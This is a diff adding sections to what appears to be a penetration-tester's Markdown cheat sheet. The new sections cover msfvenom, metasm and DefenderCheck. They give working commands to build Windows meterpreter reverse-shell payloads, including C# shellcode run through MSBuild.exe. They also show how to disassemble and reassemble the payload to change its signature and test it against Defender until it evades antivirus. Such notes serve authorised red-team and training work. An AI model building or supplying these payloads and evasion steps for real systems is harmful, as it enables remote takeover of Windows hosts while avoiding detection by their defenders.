@@ -172,6 +172,28 @@ Practice searching for payload and exploits inside of metasploit: `search type:e
     - `set lhost <your ip>`
     - `run` and wait for connection back
 
+### MSFVENOM
+- Creating a payload that uses the windows/meterpreter/reverse_tcp exploit:
+  - `msfvenom -p windows/meterpreter/reverse_tcp LHOST=<your attacker system listeing> LPORT=<your port> -f <file output type> -o <file output name> --platform <windows/etc> -a <architecture e.g., x86>`
+  - Create a C# (C-sharp) shellcode paylaod that can be run with Windows LOLBIN MSBuild.exe (After being inserted into a csharp wrapper). 
+    - `msfvenom -p <payload name> -LHOST=<lhost> -LPORT=<lport> -f csharp > payload.cs`
+    - example csharp wrapper (shellcode needs to be replaced with custom one) https://raw.githubusercontent.com/3gstudent/msbuild-inline-task/master/executes%20shellcode.xml
+    - then start a msfconsole listener with an `exploit/multi/handler` on the same port/ip as the paylaod`
+  -e.g., `msfvenom -p windows/meterpreter/reverse_tcp LHOST=192.168.1.2 LPORT=4444 -f raw -o output.raw --platform widows -a x86`
+  
+
+## METASM
+### DISASSEMBLE.RB
+Use to convert from RAW binary output to .ASM format. From here you can do some ghostwritting to avoid detection
+- `ruby /opt/metasm/samples/disassemble.rb PAYLOAD.RAW > payload.asm`
+### PEENCODE.RB
+After ghostwriting to modify signature compile the assembly file into PE format again. 
+- `ruby /opt/metasm/samples/peenconde.rb payload.asm -o payload.exe`
+
+## DefenderCheck
+Test your payload to find the part that will get picked up by AV
+- `DefenderCheck.exe <your payload.exe>`
+
 
 ## volatility
 Print the sans cheat sheet
